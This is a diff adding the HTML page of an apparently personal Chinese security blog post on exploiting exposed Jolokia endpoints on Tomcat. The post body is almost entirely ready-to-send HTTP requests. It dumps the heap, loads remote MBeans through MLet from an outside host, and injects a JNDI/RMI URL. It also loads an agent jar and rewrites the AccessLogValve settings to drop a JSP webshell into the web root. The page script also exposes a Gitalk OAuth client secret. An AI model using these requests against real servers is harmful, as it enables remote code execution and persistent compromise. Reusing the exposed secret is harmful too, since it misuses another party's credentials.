@@ -1,0 +1,376 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Example</title>
+<meta name="description" content=": )  It's Example Blog. " />
+<link rel="shortcut icon" href="https://g0uz1.top/favicon.ico?v=1689148240281">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://g0uz1.top/styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://g0uz1.top">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://g0uz1.top/images/avatar.png?v=1689148240281" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">Example</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#tomcat%E7%AF%87"># Tomcat篇</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.6000000000000001s">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a></div>
+    <a class="rss" href="https://g0uz1.top/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">Jolokia 利用</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2023-06-27 / 3 min read
+        </div>
+        
+        <div class="post-content yue">
+          <h3 id="tomcat篇"># Tomcat篇</h3>
+<p>DumpHeap</p>
+<pre><code>POST /jolokia/ HTTP/1.1
+Host: localhost:18080
+Cookie: JSESSIONID=1BDCE041848DC39636EFD242DE007575
+Content-Type: application/json
+Connection: close
+Content-Length: 170
+
+{
+    &quot;mbean&quot;: &quot;com.sun.management:type=HotSpotDiagnostic&quot;,
+    &quot;type&quot;: &quot;EXEC&quot;,
+    &quot;operation&quot;: &quot;dumpHeap&quot;,
+    &quot;arguments&quot;: [&quot;/tmp/.hprof&quot;,true]
+}
+</code></pre>
+<p>Jolokia  MLet 利用</p>
+<pre><code>POST /jolokia/ HTTP/1.1
+Host: localhost:18080
+Content-Type: application/json
+Connection: close
+Content-Length: 170
+
+{
+    &quot;mbean&quot;: &quot;DefaultDomain:type=MLet&quot;,
+    &quot;type&quot;: &quot;EXEC&quot;,
+    &quot;operation&quot;: &quot;getMBeansFromURL(java.lang.String)&quot;,
+    &quot;arguments&quot;: [&quot;http://10.168.1.100:8888/&quot;]
+}
+</code></pre>
+<p>Logging</p>
+<pre><code>POST /jolokia HTTP/1.1
+Host: 127.0.0.1:8888
+Content-Type: application/json
+Connection: close
+Content-Length: 190
+
+{
+    &quot;mbean&quot;: &quot;java.util.logging:type=Logging&quot;,
+    &quot;type&quot;: &quot;EXEC&quot;,
+    &quot;operation&quot;: &quot;getLoggerLevel&quot;,
+    &quot;arguments&quot;:[&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1099/remoteExploit8&quot;]
+}
+</code></pre>
+<p>ssss</p>
+<pre><code>POST /jolokia/ HTTP/1.1
+Host: localhost:18080
+Cookie: JSESSIONID=1BDCE041848DC39636EFD242DE007575
+Content-Type: application/json
+Connection: close
+Content-Length: 170
+
+{
+    &quot;mbean&quot;: &quot;com.sun.management:type=DiagnosticCommand&quot;,
+    &quot;type&quot;: &quot;EXEC&quot;,
+    &quot;operation&quot;: &quot;jvmtiAgentLoad&quot;,
+    &quot;arguments&quot;: [&quot;/tmp/1.jar&quot;]
+}
+</code></pre>
+<pre><code># 日志信息
+http://localhost:8080/jolokia/read/Catalina:host=localhost,name=AccessLogValve,type=Valve
+
+# 修改文件后缀
+POST /jolokia/ HTTP/1.1
+Host: localhost:8080
+Connection: keep-alive
+Content-Length: 139
+Content-Type: application/json;charset=UTF-8
+
+{
+  &quot;type&quot;: &quot;write&quot;,
+  &quot;mbean&quot;: &quot;Catalina:host=localhost,name=AccessLogValve,type=Valve&quot;,
+  &quot;attribute&quot;: &quot;suffix&quot;,
+  &quot;value&quot;: &quot;.jsp&quot;
+}
+
+# 修改文件名
+POST /jolokia/ HTTP/1.1
+Host: localhost:8080
+Connection: keep-alive
+Content-Length: 143
+Content-Type: application/json;charset=UTF-8
+
+{
+  &quot;type&quot;: &quot;write&quot;,
+  &quot;mbean&quot;: &quot;Catalina:host=localhost,name=AccessLogValve,type=Valve&quot;,
+  &quot;attribute&quot;: &quot;prefix&quot;,
+  &quot;value&quot;: &quot;webshell&quot;
+}
+
+# 修改路径
+POST /jolokia/ HTTP/1.1
+Host: localhost:8080
+Connection: keep-alive
+Content-Length: 151
+Content-Type: application/json;charset=UTF-8
+
+{
+  &quot;type&quot;: &quot;write&quot;,
+  &quot;mbean&quot;: &quot;Catalina:host=localhost,name=AccessLogValve,type=Valve&quot;,
+  &quot;attribute&quot;: &quot;directory&quot;,
+  &quot;value&quot;: &quot;webapps/ROOT/&quot;
+}
+
+# 刷新配置
+POST /jolokia/ HTTP/1.1
+Host: localhost:8080
+Connection: keep-alive
+Content-Length: 158
+Content-Type: application/json;charset=UTF-8
+
+{
+  &quot;type&quot;: &quot;EXEC&quot;,
+  &quot;mbean&quot;: &quot;Catalina:host=localhost,name=AccessLogValve,type=Valve&quot;,
+  &quot;operation&quot;: &quot;rotate(java.lang.String)&quot;,
+  &quot;arguments&quot;: []
+}
+</code></pre>
+
+        </div>
+
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://g0uz1.top/post/JramxeOG8/">
+                <h3 class="post-title">
+                  <i class="ri-arrow-left-line"></i>
+                  jdbc漏洞
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://g0uz1.top/post/I6hLmcsTq/">
+                <h3 class="post-title">
+                  shellcode 免杀学习
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: 'a23dba280edd1e49037e',
+    clientSecret: 'fd74d7d6b3470a691211438635d3e6b0d372ff6f',
+    repo: '0a52730597fb4ffa01fc117d9e71e3a9.github.io',
+    owner: '0a52730597fb4ffa01fc117d9e71e3a9',
+    admin: ['0a52730597fb4ffa01fc117d9e71e3a9'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+      </div>
+    </div>
+
+    <script src="https://g0uz1.top/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
